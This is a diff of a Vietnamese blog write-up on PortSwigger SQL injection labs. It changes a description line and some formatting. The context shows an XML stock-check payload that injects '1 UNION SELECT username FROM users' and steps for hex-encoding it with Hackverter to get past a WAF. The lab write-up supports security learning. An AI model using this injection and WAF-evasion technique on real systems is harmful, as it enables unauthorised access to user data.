@@ -1,6 +1,6 @@
 ---
 title: "[PortSwigger Lab] - Sql Injection"
-description: The first post
+description: Solution of SQLi on PortSwigger Lab
 date: 2025-05-21 22:00:00 +0700
 categories: [Cyber ​​Security, Web Pentest]
 tags: [portswigger, burpsuite, labs, web, vulnerability]   
@@ -907,7 +907,8 @@ Xuất hiện `"Attack detected"` do đã bị **WAF filter**.
 
 Dùng công cụ **Hackverter** để mã hóa XML entities, vào **BApp** tìm và tải **Hackverter**.
 
-- Tìm tên của người dùng `admin`
+Tìm tên của người dùng `admin`
+
 Payload:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -916,8 +917,7 @@ Payload:
     <storeId>1 UNION SELECT username FROM users</storeId>
 </stockCheck>
 ```
-
-- Bôi đen phần `1 UNION SELECT username FROM users` > Chuột phải > Extensions > Hackverter > Encode > Hex entities
+Bôi đen phần `1 UNION SELECT username FROM users` > Chuột phải > Extensions > Hackverter > Encode > Hex entities
 
 Request:
 ```http
